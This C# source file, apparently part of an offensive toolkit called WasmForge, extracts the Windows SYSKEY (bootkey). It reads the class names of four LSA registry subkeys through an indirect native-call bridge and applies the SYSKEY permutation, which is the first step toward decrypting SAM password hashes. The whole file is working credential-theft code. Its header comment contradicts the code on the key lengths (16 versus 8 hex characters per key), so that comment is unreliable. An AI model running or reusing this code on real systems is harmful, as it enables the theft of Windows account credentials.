// WfBootkey.cs — SYSKEY (bootkey) extraction via direct Win32 wf_call pattern.
// Replaces the deleted internal/hostmod/nativeaot_bootkey_windows.go Go bridge.
// Follows the WfNetapi.cs canonical pattern: mod_load → mod_resolve → mod_invoke.
//
// Algorithm: Opens four LSA registry subkeys under
//   HKLM\SYSTEM\CurrentControlSet\Control\Lsa\{JD, Skew1, GBG, Data}
// and reads the **class name** of each key (set to a 16-char hex string by the
// kernel at boot).  The four 16-char strings are concatenated (64 chars = 32 hex
// digits) and hex-decoded to 16 bytes, then the standard SYSKEY permutation is
// applied to produce the bootkey.
//
// Requires SYSTEM privileges (RegQueryInfoKeyW on these keys returns
// ERROR_ACCESS_DENIED for non-SYSTEM callers).
//
// API used: advapi32!RegOpenKeyExW + advapi32!RegQueryInfoKeyW + advapi32!RegCloseKey
// RegQueryInfoKeyW prototype:
//   LONG RegQueryInfoKeyW(HKEY hKey,
//     LPWSTR lpClass, LPDWORD lpcchClass,   ← class name + char count (in/out)
//     LPDWORD lpReserved,                   ← NULL
//     LPDWORD lpcSubKeys,                   ← NULL
//     LPDWORD lpcbMaxSubKeyLen,             ← NULL
//     LPDWORD lpcbMaxClassLen,              ← NULL
//     LPDWORD lpcValues,                    ← NULL
//     LPDWORD lpcbMaxValueNameLen,          ← NULL
//     LPDWORD lpcbMaxValueLen,              ← NULL
//     LPDWORD lpcbSecurityDescriptor,       ← NULL
//     PFILETIME lpftLastWriteTime)          ← NULL

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace WasmForge.Helpers
{
    public static unsafe class WfBootkey
    {
        // ── Bridge primitives (WfNetapi.cs pattern) ─────────────────────────────
        [DllImport("env", EntryPoint = "mod_load")]
        private static extern uint mod_load(uint namePtr);

        [DllImport("env", EntryPoint = "mod_resolve")]
        private static extern uint mod_resolve(uint libHandle, uint namePtr);

        [DllImport("env", EntryPoint = "mod_invoke")]
        private static extern ulong mod_invoke(
            ulong procHandle, uint nargs,
            ulong a0, ulong a1, ulong a2, ulong a3,
            ulong a4, ulong a5, ulong a6, ulong a7,
            ulong a8, ulong a9, ulong a10, ulong a11,
            ulong a12, ulong a13, ulong a14,
            ulong ret1Ptr, ulong errPtr);

        // ── Cached proc handles ──────────────────────────────────────────────────
        private static uint _advapi32;
        private static uint _ntdll;
        private static uint _hRegOpenKeyExW;
        private static uint _hRegQueryInfoKeyW;
        private static uint _hRegCloseKey;
        private static uint _hRtlMoveMemory;

        private static uint Resolve(string dll, ref uint cachedLib, string fn, ref uint cachedProc)
        {
            if (cachedProc != 0) return cachedProc;
            if (cachedLib == 0)
            {
                byte[] db = Encoding.ASCII.GetBytes(dll + "\0");
                fixed (byte* dp = db) cachedLib = mod_load((uint)(IntPtr)dp);
                if (cachedLib == 0) return 0;
            }
            byte[] fb = Encoding.ASCII.GetBytes(fn + "\0");
            fixed (byte* fp = fb) cachedProc = mod_resolve(cachedLib, (uint)(IntPtr)fp);
            return cachedProc;
        }

        private static ulong Invoke(uint proc, uint nargs,
            ulong a0=0, ulong a1=0, ulong a2=0, ulong a3=0,
            ulong a4=0, ulong a5=0, ulong a6=0, ulong a7=0,
            ulong a8=0, ulong a9=0, ulong a10=0, ulong a11=0)
        {
            ulong ret1=0, err=0;
            return mod_invoke((ulong)proc, nargs,
                a0,a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,0,0,0,
                (ulong)(uint)(IntPtr)(&ret1),
                (ulong)(uint)(IntPtr)(&err));
        }

        // Encode a managed string as NUL-terminated UTF-16LE in a pinned byte array.
        private static IntPtr Utf16AllocPinned(string s, out GCHandle handle)
        {
            byte[] bytes = new byte[(s.Length + 1) * 2];
            for (int i = 0; i < s.Length; i++)
            {
                char c = s[i];
                bytes[2*i]   = (byte)(c & 0xff);
                bytes[2*i+1] = (byte)((c >> 8) & 0xff);
            }
            handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            return handle.AddrOfPinnedObject();
        }

        // ── Public API ───────────────────────────────────────────────────────────

        /// <summary>
        /// Extracts the SYSKEY (bootkey) by reading the class names of the four
        /// registry subkeys JD / Skew1 / GBG / Data under
        /// HKLM\SYSTEM\CurrentControlSet\Control\Lsa\.
        ///
        /// Returns 16-byte bootkey on success, or an empty array if the current
        /// process lacks SYSTEM privileges or any subkey is inaccessible.
        /// </summary>
        public static byte[] GetBootKey()
        {
            try
            {
                uint pOpen  = Resolve("advapi32.dll", ref _advapi32, "RegOpenKeyExW",   ref _hRegOpenKeyExW);
                uint pInfo  = Resolve("advapi32.dll", ref _advapi32, "RegQueryInfoKeyW", ref _hRegQueryInfoKeyW);
                uint pClose = Resolve("advapi32.dll", ref _advapi32, "RegCloseKey",      ref _hRegCloseKey);
                if (pOpen == 0 || pInfo == 0 || pClose == 0) return Array.Empty<byte>();

                // The four LSA subkeys whose class names contain the scrambled bootkey.
                string[] subkeys = { "JD", "Skew1", "GBG", "Data" };
                string hexConcat = "";

                foreach (string sub in subkeys)
                {
                    // RegOpenKeyExW(HKEY_LOCAL_MACHINE=0x80000002, subkeyPath, 0, KEY_READ=0x20019, &hKey)
                    string path = @"SYSTEM\CurrentControlSet\Control\Lsa\" + sub;
                    GCHandle pathHandle;
                    IntPtr pathPtr = Utf16AllocPinned(path, out pathHandle);
                    ulong hKey = 0;
                    try
                    {
                        long rc = (long)(int)(uint)Invoke(pOpen, 5,
                            0x80000002u,                                   // HKEY_LOCAL_MACHINE
                            (ulong)(uint)(IntPtr)pathPtr,                   // subkey path (WASM ptr)
                            0u,                                             // ulOptions
                            0x20019u,                                       // KEY_READ
                            (ulong)(uint)(IntPtr)(&hKey));                  // &hKey
                        if (rc != 0 || hKey == 0) return Array.Empty<byte>();
                    }
                    finally
                    {
                        pathHandle.Free();
                    }

                    try
                    {
                        // RegQueryInfoKeyW:
                        //   lpClass = WASM buf (64 chars = 128 bytes, enough for any class name)
                        //   lpcchClass = in: char buf size, out: actual char count
                        //   All remaining optional params = NULL
                        byte[] classBuf = new byte[128]; // 64 UTF-16 chars
                        uint   classCch = 64;
                        long   qrc;
                        fixed (byte* cbp = classBuf)
                        {
                            qrc = (long)(int)(uint)Invoke(pInfo, 12,
                                hKey,
                                (ulong)(uint)(IntPtr)cbp,              // lpClass  (WASM ptr)
                                (ulong)(uint)(IntPtr)(&classCch),      // lpcchClass
                                0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u); // all optional = NULL
                        }
                        if (qrc != 0) return Array.Empty<byte>();

                        // Decode the class name (UTF-16LE in classBuf) to a managed string.
                        int len = (int)classCch;
                        char[] chars = new char[len];
                        for (int i = 0; i < len; i++)
                            chars[i] = (char)(classBuf[2*i] | (classBuf[2*i+1] << 8));
                        hexConcat += new string(chars);
                    }
                    finally
                    {
                        Invoke(pClose, 1, hKey);
                    }
                }

                // hexConcat is 32 hex chars (16 bytes of scrambled bootkey) — each subkey
                // contributes exactly 8 hex chars = 4 bytes.
                if (hexConcat.Length != 32) return Array.Empty<byte>();

                byte[] scrambled = new byte[16];
                for (int i = 0; i < 16; i++)
                    scrambled[i] = Convert.ToByte(hexConcat.Substring(i*2, 2), 16);

                // Apply the standard SYSKEY permutation.
                byte[] permutation = { 0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3,
                                       0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7 };
                byte[] bootkey = new byte[16];
                for (int i = 0; i < 16; i++)
                    bootkey[i] = scrambled[permutation[i]];

                return bootkey;
            }
            catch
            {
                return Array.Empty<byte>();
            }
        }
    }
}
